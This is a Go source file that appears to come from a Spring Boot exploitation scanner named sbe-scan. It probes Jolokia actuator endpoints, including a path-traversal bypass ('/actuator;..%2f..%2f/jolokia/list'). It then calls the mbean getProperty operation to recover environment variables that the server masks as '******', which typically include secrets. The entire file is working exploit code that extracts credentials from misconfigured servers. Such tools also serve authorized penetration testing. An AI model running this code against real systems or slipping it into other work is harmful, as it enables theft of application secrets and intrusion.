package one

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/wjlin0/sbe-scan/pkg/method"
	"github.com/wjlin0/sbe-scan/pkg/types"
	"net/http"
	"strings"
	"sync"
)

type Agent struct {
	EnvJson *method.Configuration
}

const (
	Source = "one"
)

func (a *Agent) Name() string {
	return Source
}

func (a *Agent) Run(domain string, sessions *method.Session, options *types.Options, oldEnvJson *method.Configuration) error {
	var (
		jolokiaURL  string
		jolokiaList *method.JolokiaList
		urls        []string
	)
	if options.IsJolokiaListAuto() {
		urls = append(urls, "/jolokia/list", "/actuator/jolokia/list", "/actuator;..%2f..%2f/jolokia/list")
	} else {
		urls = append(urls, options.JolokiaListURL...)
	}
	if jolokiaListMap, err := sessions.GetJolokiaList(domain, urls...); err != nil {
		return err
	} else {
		for url, jolokia := range jolokiaListMap {
			jolokiaURL = strings.Replace(url, "/list", "", 1)
			jolokiaList = jolokia
		}
	}
	// 判断是否存在 getProperty 的 mbean
	if !jolokiaList.IsGetProperty() {
		return errors.New("method one can't get env value")
	}
	// 获取 env 的内容
	oldProperties := oldEnvJson.GetProperties()
	newProperties := make(map[string]string)
	for key, value := range oldProperties {
		newProperties[key] = value
	}
	var properties []string
	switch options.IsEnvNameAuto() {
	case false:
		properties = options.EnvName
	case true:
		for property, value := range oldProperties {
			if value == "******" {
				properties = append(properties, property)
			}
		}
	}
	for _, property := range properties {
		_, err := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
		if err != nil {
			return err
		}
		break
	}
	var wg sync.WaitGroup
	var lock sync.Mutex
	for _, property := range properties {
		wg.Add(1)
		go func(property string) {
			defer wg.Done()
			values, _ := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
			if values != "" {
				lock.Lock()
				newProperties[property] = values
				lock.Unlock()
				gologger.Debug().Msgf("method one get env value %s=%s", property, values)
			}

		}(property)
	}
	wg.Wait()
	a.EnvJson = oldEnvJson.Clone()
	a.EnvJson.UpdatePropertiesValue(newProperties)
	return nil
}

// Describe 描述方法一是什么
func Describe() string {
	return "利用 jolokia 中利用的 mbean.getProperty 获取 springboot 的环境变量"
}
func (a *Agent) getEnvValue(sessions *method.Session, options *types.Options, url, mbean, env string) (string, error) {
	var (
		err     error
		resp    *http.Response
		request *retryablehttp.Request
		body    *bytes.Buffer
	)

	postBody := fmt.Sprintf("{\"mbean\": \"%s\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}", mbean, env)
	if request, err = sessions.NewRequest(http.MethodPost, url, postBody); err != nil {
		return "", err
	}
	if request.Header.Get("Content-Type") == "" {
		request.Header.Set("Content-Type", "application/json")
	}
	if resp, err = sessions.Do(request); err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("unexpected status code %d received from %s", resp.StatusCode, url)
	}
	if body, err = method.ReadBody(resp); err != nil {
		return "", err
	}

	// 序列化 json
	responseJson := jsonRequest{}
	if err = json.Unmarshal(body.Bytes(), &responseJson); err != nil {
		return "", err
	}
	return responseJson.Value, nil
}

// jsonRequest 定义与 JSON 对应的结构体
type jsonRequest struct {
	Value string `json:"value"`
}
